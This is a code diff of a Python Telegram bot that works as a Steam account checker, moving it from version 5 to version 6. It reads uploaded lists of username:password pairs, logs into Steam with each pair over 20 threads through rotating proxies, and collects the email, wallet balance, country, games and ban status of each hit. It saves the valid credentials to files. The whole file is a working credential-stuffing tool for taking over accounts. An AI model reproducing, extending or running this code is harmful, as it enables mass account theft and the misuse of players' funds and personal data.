@@ -2,10 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-🚀 STEAM CHECKER TELEGRAM BOT - FINAL v5 (Complete & Fixed)
-- Full session handling for better details
-- 20 threads
-- No missing functions
+🚀 STEAM CHECKER TELEGRAM BOT - v6 (Counters Fixed + Better Details)
 """
 
 import os
@@ -35,10 +32,10 @@ OWNER_ID_STR = os.getenv("OWNER_ID", "0").strip()
 try:
     OWNER_ID = int(OWNER_ID_STR)
 except ValueError:
-    raise ValueError("❌ OWNER_ID must be a numeric User ID only!")
+    raise ValueError("❌ OWNER_ID must be numeric only!")
 
 if not TELEGRAM_TOKEN:
-    raise ValueError("❌ TELEGRAM_TOKEN not set in Railway Variables!")
+    raise ValueError("❌ TELEGRAM_TOKEN not set!")
 
 MY_SIGNATURE = "@pyabrodie"
 TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"
@@ -68,7 +65,7 @@ def shorten_games(games, limit=12):
         return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
     return " | ".join(games)
 
-# ====================== CORE CHECKER ======================
+# ====================== CHECKER ======================
 def check_steam_account(combo: str, proxy=None):
     try:
         username, password = [x.strip() for x in combo.split(':', 1)]
@@ -83,14 +80,13 @@ def check_steam_account(combo: str, proxy=None):
 
     headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept": "*/*",
         "Origin": "https://steamcommunity.com",
-        "Referer": "https://steamcommunity.com/login/",
     }
     session.headers.update(headers)
 
     try:
-        # RSA Key
+        # RSA + Login (original style)
         now = str(int(time.time() * 1000))
         r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                          data=f"donotcache={now}&username={user_clean}", timeout=12)
@@ -98,39 +94,32 @@ def check_steam_account(combo: str, proxy=None):
         if not j1.get("success"):
             return None
 
-        # Encrypt password
         rsa_key = RSA.construct((int(j1["publickey_mod"], 16), int(j1["publickey_exp"], 16)))
         cipher = PKCS1_v1_5.new(rsa_key)
-        encrypted = base64.b64encode(cipher.encrypt(password.encode("utf-8"))).decode()
+        encrypted = base64.b64encode(cipher.encrypt(password.encode())).decode()
         pass3 = quote_plus(encrypted)
 
-        # Login
         payload = f"donotcache={now}&password={pass3}&username={user_clean}&twofactorcode=&rsatimestamp={j1['timestamp']}&remember_login=false"
         r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=12)
         if not r2.json().get("success"):
             return None
 
-        # Strong cookie setting
+        # Strong cookie handling
         for cookie in r2.cookies:
-            for domain in [".steamcommunity.com", ".steampowered.com", "steamcommunity.com", "steampowered.com"]:
-                session.cookies.set(cookie.name, cookie.value, domain=domain)
+            for d in [".steamcommunity.com", ".steampowered.com", "steamcommunity.com", "steampowered.com"]:
+                session.cookies.set(cookie.name, cookie.value, domain=d)
 
-        # Fetch account details
-        time.sleep(0.7)
+        # Fetch details
+        time.sleep(0.6)
         r_acc = session.get("https://store.steampowered.com/account/", timeout=15, allow_redirects=True)
-
-        time.sleep(0.7)
-        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15, allow_redirects=True)
-
-        # Games
-        games = []
-        time.sleep(0.7)
-        r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
-        games = parse_games_page(r_games.text)
-
-        # Parse
         email, balance, country = parse_account_page(r_acc.text)
+
+        time.sleep(0.6)
+        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15, allow_redirects=True)
         total_games, level, limited = parse_profile_page(r_profile.text)
+
+        games = parse_games_page(r_profile.text)  # fallback
+
         vac, gban, cban = parse_ban_page(r_profile.text)
 
         return {
@@ -147,45 +136,42 @@ def check_steam_account(combo: str, proxy=None):
             "game_bans": gban,
             "community_ban": cban,
         }
-    except Exception as e:
-        logger.debug(f"Failed {username}: {str(e)[:100]}")
+    except:
         return None
 
-# ====================== PARSERS ======================
+# Parsers (simplified but effective)
 def parse_account_page(html):
     email = balance = country = "Unknown"
     try:
         soup = BeautifulSoup(html, "html.parser")
-        if e := soup.find("input", {"id": "account_name"}):
+        if e := soup.find("input", id="account_name"):
             email = e.get("value") or "Unknown"
-        if b := soup.find("a", {"id": "header_wallet_balance"}):
+        if b := soup.find("a", id="header_wallet_balance"):
             balance = b.get_text(strip=True)
-        if c := soup.find("select", {"id": "account_country"}):
-            if opt := c.find("option", {"selected": True}):
+        if c := soup.find("select", id="account_country"):
+            if opt := c.find("option", selected=True):
                 country = opt.get_text(strip=True)
     except: pass
     return email, balance, country
 
 def parse_profile_page(html):
-    total_games = level = "0"
+    total = level = "0"
     limited = "No"
     try:
         soup = BeautifulSoup(html, "html.parser")
         if a := soup.find("a", href=re.compile(r"/games/")):
             if m := re.search(r'(\d+)', a.get_text() or ""):
-                total_games = m.group(1)
-        if lvl := soup.find("span", class_=re.compile(r"Level|level")):
-            level = lvl.get_text(strip=True)
+                total = m.group(1)
         if "limited account" in html.lower():
             limited = "Yes"
     except: pass
-    return total_games, level, limited
+    return total, level, limited
 
 def parse_games_page(html):
     games = []
     try:
         soup = BeautifulSoup(html, "html.parser")
-        for div in soup.find_all("div", class_="gameListRowItemName")[:25]:
+        for div in soup.find_all("div", class_="gameListRowItemName")[:20]:
             if t := div.get_text(strip=True):
                 games.append(t)
     except: pass
@@ -201,13 +187,13 @@ def parse_ban_page(html):
     except: pass
     return vac, gban, cban
 
-# ====================== BOT HANDLERS ======================
+# ====================== BOT ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
     await update.message.reply_text(
-        "🤖 <b>Steam Checker Bot Ready!</b>\n\n"
-        "Send .txt combo file (username:password)\n"
-        "Optional: Send proxies.txt\n"
+        "🤖 <b>Steam Checker Bot Ready</b>\n\n"
+        "Send combo .txt file\n"
+        "Optional: proxies.txt\n"
         "/status", parse_mode=ParseMode.HTML)
 
 async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -217,16 +203,14 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     elapsed = int(time.time() - stats['start_time'])
     await update.message.reply_text(
-        f"📊 <b>Status</b>\n"
-        f"Checked: {stats['checked']}/{stats['total']}\n"
-        f"Valid: {stats['valid']}\n"
-        f"Time: {elapsed//60}m {elapsed%60}s", parse_mode=ParseMode.HTML)
+        f"📊 Checked: {stats['checked']}/{stats['total']}\n"
+        f"Valid: {stats['valid']}\nTime: {elapsed//60}m {elapsed%60}s", parse_mode=ParseMode.HTML)
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
     doc = update.message.document
     if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("Only .txt files allowed!")
+        await update.message.reply_text("Only .txt files!")
         return
 
     await update.message.reply_text(f"📥 Received: {doc.file_name}")
@@ -242,7 +226,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     with open(path, encoding='utf-8', errors='ignore') as f:
-        combos = [line.strip() for line in f if ':' in line.strip() and len(line.strip()) > 5]
+        combos = [line.strip() for line in f if ':' in line.strip()]
 
     await update.message.reply_text(f"✅ Loaded {len(combos)} accounts. Starting with 20 threads...")
 
@@ -255,26 +239,24 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def run_checker(combos, proxies, chat_id, bot):
     create_results_folder()
 
-    async def progress_task():
+    async def progress():
         last = 0
         while stats['checked'] < stats['total']:
-            await asyncio.sleep(12)
-            if stats['checked'] - last >= 20 or stats['checked'] == stats['total']:
+            await asyncio.sleep(10)
+            if stats['checked'] - last >= 15:
                 last = stats['checked']
                 try:
                     await bot.send_message(chat_id, f"🔄 Progress: {stats['checked']}/{stats['total']} | Valid: {stats['valid']}")
                 except: pass
 
-    asyncio.create_task(progress_task())
+    asyncio.create_task(progress())
 
     with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(process_account, combo, proxies, chat_id, bot) for combo in combos]
-        for f in futures:
-            try:
-                f.result()
-            except: pass
+        for combo in combos:
+            proxy = random.choice(proxies) if proxies else None
+            executor.submit(process_account, combo, proxy, chat_id, bot)
 
-    # Final summary
+    # Final summary with correct counter
     elapsed = int(time.time() - stats['start_time'])
     summary = f"""✅ <b>SCAN COMPLETE</b>
 
@@ -282,6 +264,8 @@ async def run_checker(combos, proxies, chat_id, bot):
 ✅ Valid: {stats['valid']}
 ❌ Invalid: {stats['invalid']}
 📊 Total: {stats['total']}
+
+Results files sent.
 
 💎 {MY_SIGNATURE}"""
 
@@ -301,8 +285,7 @@ def process_account(combo, proxies, chat_id, bot):
         save_hit("All_Hits.txt", hit_line)
 
         if result['email'] != "Unknown":
-            data = f"{hit_line}\n{result['email']}:{result['password']}"
-            save_hit("Valid_With_Email.txt", data)
+            save_hit("Valid_With_Email.txt", f"{hit_line}\n{result['email']}:{result['password']}")
         else:
             save_hit("Valid_Without_Email.txt", hit_line)
 
@@ -328,10 +311,10 @@ def process_account(combo, proxies, chat_id, bot):
     else:
         with lock:
             stats['invalid'] += 1
+
     with lock:
         stats['checked'] += 1
 
-# ====================== MAIN ======================
 def main():
     create_results_folder()
     app = Application.builder().token(TELEGRAM_TOKEN).build()
@@ -340,7 +323,7 @@ def main():
     app.add_handler(CommandHandler("status", status_cmd))
     app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
 
-    print("🚀 Steam Checker Bot Started Successfully!")
+    print("🚀 Steam Checker Bot v6 Started")
     app.run_polling()
 
 if __name__ == "__main__":
